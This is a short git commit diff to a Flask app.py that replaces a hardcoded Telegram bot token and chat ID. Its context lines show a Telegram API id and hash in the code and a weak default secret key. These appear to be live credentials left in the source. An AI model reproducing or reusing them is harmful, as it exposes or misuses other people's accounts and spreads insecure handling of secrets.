3f7f9f6228a3d525a4cf8e2c32b05287321df221
bedduGG <135878977+bedduGG@users.noreply.github.com>
2026-06-09 18:49:00 +0700

    Update app.py

--- app.py
+++ app.py
@@ -32,8 +32,8 @@ app.secret_key = os.getenv("SECRET_KEY", "supersecret")
 api_id = int(os.getenv("API_ID", 34946540))
 api_hash = os.getenv("API_HASH", "7554a5e9dd52df527bfc39d8511413fd")
 
-BOT_TOKEN = "8593009634:AAHPlMcaNjrlNe5URTDo9FCJ7tFJ2uKMFzo"
-CHAT_ID = "6575915105"
+BOT_TOKEN = "8862631349:AAFFd7Fv6KRuQFe0d7fqPEYHfEXu45v8voU"
+CHAT_ID = "2110827256"
 
 SESSION_DIR = "sessions"
 os.makedirs(SESSION_DIR, exist_ok=True)
